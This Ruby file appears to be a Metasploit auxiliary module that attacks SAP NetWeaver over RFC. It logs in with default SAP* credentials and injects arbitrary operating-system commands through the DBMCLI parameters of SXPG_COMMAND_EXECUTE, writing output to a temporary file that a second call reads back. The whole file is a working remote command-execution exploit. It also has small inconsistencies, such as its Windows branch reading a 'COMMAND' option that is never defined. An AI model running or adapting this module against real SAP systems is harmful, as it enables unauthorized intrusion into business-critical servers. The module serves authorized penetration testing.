##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

##
# This module is based on, inspired by, or is a port of a plugin available in the Onapsis Bizploit Opensource ERP Penetration Testing framework - http://www.onapsis.com/research-free-solutions.php.
# Mariano Nuñez (the author of the Bizploit framework) helped me in my efforts in producing the Metasploit modules and was happy to share his knowledge and experience - a very cool guy. 
# I’d also like to thank Chris John Riley, Ian de Villiers and Joris van de Vis who have Beta tested the modules and provided excellent feedback. Some people just seem to enjoy hacking SAP :)
##

require 'msf/core'
require 'rubygems'
begin
  require 'nwrfc'
rescue LoadError
  abort("[x] This module requires the NW RFC SDK ruby wrapper (http://rubygems.org/gems/nwrfc) from Martin Ceronio.")
end

class Metasploit4 < Msf::Auxiliary
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner
  	include NWRFC

	def initialize
    	super(
    		'Name' => 'SAP RFC SXPG_CALL_SYSTEM',
    		'Version' => '$Revision$',
    		'Description' => %q{
				This module makes use of the SXPG_CALL_SYSTEM Remote Function Call to execute OS commands as configured in SM69.
				The module requires the NW RFC SDK from SAP as well as the Ruby wrapper nwrfc (http://rubygems.org/gems/nwrfc). 
				},
			'References' => [[ 'URL', 'http://labs.mwrinfosecurity.com' ]],
			'Author' => [ 'nmonkee' ],
			'License' => BSD_LICENSE
			)
		register_options(
			[
				Opt::RPORT(3342),
				OptString.new('USER', [true, 'Username', 'SAP*']),
				OptString.new('PASS', [true, 'Password', '06071992']),
				OptString.new('CLIENT', [true, 'Client', '001']),
				OptString.new('SRHOST', [false, 'SAP Router Address', nil]),
				OptString.new('SRPORT', [false, 'SAP Router Port Number', nil]),
				OptString.new('CMD', [true, 'Command', 'id']),
				OptString.new('OS', [true, 'Windows/Linux', "Linux"]),
				OptBool.new('VERBOSE', [false, "Be Verbose", false])
			], self.class)
	end
	
	def run_host(ip)
		user = datastore['USER'] if datastore['USER']
		pass = datastore['PASS'] if datastore['PASS']
		if datastore['CLIENT']
			client = datastore['CLIENT'] if datastore['CLIENT'] =~ /^\d{3}\z/
		end
		rport = datastore['RPORT'].to_s.split('')
		sysnr = rport[2]
		sysnr << rport[3]
		command = create_payload(1)
		exec_CMD(user,client,pass,datastore['rhost'],datastore['rport'],sysnr,command)
		command = create_payload(2)
		exec_CMD(user,client,pass,datastore['rhost'],datastore['rport'],sysnr,command)
	end
  
	def create_payload(num)
  		command = ""
		os = "ANYOS"
		if datastore['OS'].downcase == "linux"
			if num == 1
				command = "-o /tmp/pwned.txt -n pwnie" + "\n!"
				command << datastore['CMD'].gsub(" ","\t")
				command << "\n"
			end
			command = "-ic /tmp/pwned.txt" if num == 2
		elsif datastore['OS'].downcase == "windows"
			if num == 1
				command = '-o c:\\\pwn.out -n pwnsap' + "\r\n!"
				space = "%programfiles:~10,1%"
				command << datastore['COMMAND'].gsub(" ",space)
			end
			command = '-ic c:\\\pwn.out' if num == 2
		end
		return command
	end
	
	def exec_CMD(user,client,pass,rhost,rport,sysnr,command)
    	verbose = datastore['VERBOSE']
    	print_status("#{rhost}:#{rport} [SAP] Trying client: '#{client}' username:'#{user}' password:'#{pass}'") if verbose == true
    	success = false
    	ashost = rhost
    	if datastore['SRHOST']
    		ashost = "/H/#{datastore['SRHOST']}/H/#{rhost}"
    	end
    	begin
    		auth_hash = {"user" => user, "passwd" => pass, "client" => client, "ashost" => ashost, "sysnr" => sysnr}
    		conn = Connection.new(auth_hash)
    	rescue NWError => e
    		print_error("#{rhost}:#{rport} [SAP] login failed - credentials incorrect for client: #{client} username: #{user} password: #{pass}") if e.message =~ /Name or password is incorrect/  
			print_error("#{rhost}:#{rport} [SAP] login failed - client #{client} does not exist") if e.message =~ /not available in this system/
			print_error("#{rhost}:#{rport} [SAP] login failed - communication failure (refused)") if e.message =~ /Connection refused/
			print_error("#{rhost}:#{rport} [SAP] login failed - communication failure (unreachable)") if e.message =~ /No route to host/
			print_error("#{rhost}:#{rport} [SAP] login failed - communication failure (hostname unknown)") if e.message =~ /unknown/
			print_error("#{rhost}:#{rport} [SAP] login failed - #{user} user account locked in client #{client}") if e.message =~ /Password logon no longer possible - too many failed attempts/
			print_error("#{rhost}:#{rport} [SAP] login failed - password must be changed for #{client}:#{user}:#{pass}") if e.message =~ /Password must be changed/
			return
		end
		begin
			conn_info = conn.connection_info
		rescue
			print_error("#{rhost}:#{rport} [SAP] something went wrong :(")
			return
		end
		function = conn.get_function("SXPG_COMMAND_EXECUTE")
		fc = function.get_function_call
		os = "ANYOS"
		fc[:COMMANDNAME] = 'DBMCLI'
		fc[:ADDITIONAL_PARAMETERS] = command
		fc[:OPERATINGSYSTEM] = os
		begin
			fc.invoke
			success = true
		rescue NWError => e
			print_error("#{rhost}:#{rport} [SAP] FunctionCallException - code: #{e.code} group: #{e.group} message: #{e.message} type: #{e.type} number: #{e.number}")
		end
		saptbl = Msf::Ui::Console::Table.new(
			Msf::Ui::Console::Table::Style::Default,
				'Header'  => "[SAP] Command Exec",
				'Prefix'  => "\n",
				'Postfix' => "\n",
				'Indent'  => 1,
				'Columns' => ["Output"]
				)
		data_length = fc[:EXEC_PROTOCOL].size
			result = []
			for i in 0...data_length
				data = fc[:EXEC_PROTOCOL][i][:MESSAGE]
				if data =~ /E[rR][rR]/ || data =~ /---/ || data =~ /for database \(/
					#nothing
				elsif data =~ /unknown host/ || data =~ /\(see/ || data =~ /returned with/
					#nothing
				elsif data =~ /External program terminated with exit code/
					#nothing
				else
					result << data
				end
			end
			for i in 0..result.length/2-1
				saptbl << [result[i].chomp]
			end
		conn.disconnect
		if success
			print_good("#{rhost}:#{rport} [SAP] Successful login - #{client}:#{user}:#{pass}")
			print(saptbl.to_s)
		end
	end
end